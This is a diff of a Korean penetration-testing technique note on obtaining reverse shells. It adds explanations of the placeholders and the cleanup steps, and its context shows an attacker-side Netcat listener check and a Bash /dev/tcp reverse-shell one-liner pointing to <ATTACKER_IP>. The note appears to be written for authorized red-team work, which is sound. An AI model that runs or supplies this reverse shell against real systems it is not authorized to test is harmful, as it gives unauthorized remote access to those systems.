@@ -14,11 +14,7 @@ tags:
 
 대상에서 이미 명령을 실행할 수 있고 대상이 공격 호스트의 수신 주소와 TCP 포트로 연결할 수 있다면, 역방향 연결을 실행해 현재 명령 실행 계정의 대화형 셸을 받는다.
 
-## 사용할 때
-
-- Web Shell, RCE, 업로드 payload, WMI/WinRM 명령 실행이 가능할 때.
-- 공격 호스트에서 대상의 새 수신 포트로는 연결할 수 없지만 대상에서 공격 호스트로 나가는 TCP 연결은 허용될 때.
-- 일반 명령 실행을 지속적인 대화형 세션으로 바꾸고 싶을 때.
+Web Shell·RCE·업로드 payload·WMI/WinRM으로 대상에서 명령을 실행할 수 있고, 공격 호스트의 새 수신 포트로 향하는 대상의 TCP 연결이 가능해야 한다. 연결은 현재 실행 계정의 세션일 뿐 권한 상승을 뜻하지 않는다.
 
 ## 전제 조건
 
@@ -30,6 +26,8 @@ tags:
 
 ## 실행
 
+`<ATTACKER_IP>`와 `<PORT>`는 대상이 연결할 공격 호스트 listener의 IPv4 주소와 TCP 포트다. `<REMOTE_SHELL_PID>`은 연결 뒤 대상 셸에서 관찰한 PID이고 `<LISTENER_PID>`은 공격 호스트의 `ss` 출력에서 얻는다. 연결만으로 대상 Identity·권한 또는 handler 성공을 판정하지 않는다.
+
 1. 공격자 listener를 먼저 연다.
 2. 대상 OS와 사용 가능한 interpreter에 맞는 payload를 고른다.
 3. 명령을 실행하고 연결이 들어오는지 확인한다.
@@ -38,6 +36,8 @@ tags:
 ### Linux 공격 호스트에서 listener 시작
 
 `ss`로 선택한 포트의 기존 listener를 확인한 뒤 전용 터미널에서 Netcat을 실행한다. 연결이 들어온 뒤 두 번째 공격 호스트 터미널에서 같은 `ss` 명령으로 실제 `<LISTENER_PID>`를 기록한다.
+
+이 block은 공격 호스트에서 실행한다. `<PORT>`는 작업 전 비어 있는 listener TCP 포트(가상 예: `4444`)이고 `<LISTENER_PID>`는 연결 뒤 `ss` 출력에서 해당 listener와 함께 기록한다.
 
 ```bash
 ss -ltnp 'sport = :<PORT>'
@@ -55,6 +55,8 @@ ss -ltnp 'sport = :<PORT>'
 - 대상에서 연결이 들어오면 shell prompt 또는 명령 출력.
 
 ### Linux 대상 호스트에서 Bash reverse shell 실행
+
+이 block은 Linux 대상의 기존 명령 실행 context에서 실행한다. `<ATTACKER_IP>`·`<PORT>`는 위 listener의 IP·포트를 재사용하며, `<REMOTE_SHELL_PID>`는 연결 뒤 대상에서 `echo $$`와 `ps` 출력으로 기록한다. TCP 연결은 대상 identity 확인 전 상태다.
 
 ```bash
 bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1'
@@ -113,7 +115,7 @@ $client.Close()
 |---|---|---|---|
 | 대상 reverse shell process | 연결 뒤 기록한 `<REMOTE_SHELL_PID>`·시작 시각·command line 또는 path | 연결이 살아 있으면 원격 셸의 `exit`; 이미 끊겼지만 원래 명령 실행 경로가 남아 있으면 PID·시작 시각·command line을 대조한 뒤에만 `kill <REMOTE_SHELL_PID>` 또는 `Stop-Process -Id <REMOTE_SHELL_PID>` | 기록한 PID가 없거나, PID가 재사용됐으면 시작 시각·command line이 달라 별도 process임을 확인 |
 | 공격 호스트 listener | 실행 전 포트 상태와 `<LISTENER_PID>` | 원격 정리 뒤 전용 터미널의 `Ctrl+C`; 터미널을 잃었으면 command line을 다시 대조한 뒤 `kill <LISTENER_PID>` | `ps -p <LISTENER_PID>`에 process가 없고 `ss -ltnp 'sport = :<PORT>'`에 이번 PID가 없음 |
-| 전달한 script·payload·임시 파일 | 실행 전 존재하지 않은 exact 경로와 hash | 생성한 기법 문서의 복구 절차로 exact 경로만 제거 | 해당 경로가 없고 기존 파일은 유지됨 |
+| 전달한 script·payload·임시 파일 | 실행 전 존재하지 않은 exact 경로 | 생성한 기법 문서의 복구 절차로 exact 경로만 제거 | 해당 경로가 없고 기존 파일은 유지됨 |
 
 연결이 끊긴 뒤 process를 확인할 때는 원래 명령 실행 경로에서 다음처럼 조회한다.
 
